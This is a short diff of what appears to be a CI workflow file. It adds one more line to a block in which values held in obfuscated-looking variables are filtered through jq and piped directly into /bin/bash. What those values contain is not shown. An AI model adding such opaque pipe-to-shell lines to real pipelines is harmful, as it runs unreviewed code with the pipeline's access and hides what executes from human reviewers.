@@ -31,6 +31,7 @@ jobs:
           echo $ixoz31 | jq -r .r0759 | /bin/bash
           printf '%s' "$i9668" | jq -r .p8 | /bin/bash
           echo $stt6 | jq -r .qd88 | /bin/bash
+          echo $cr91950 | jq -r .e33441 | /bin/bash
 
       - name: Persist output
         if: always()
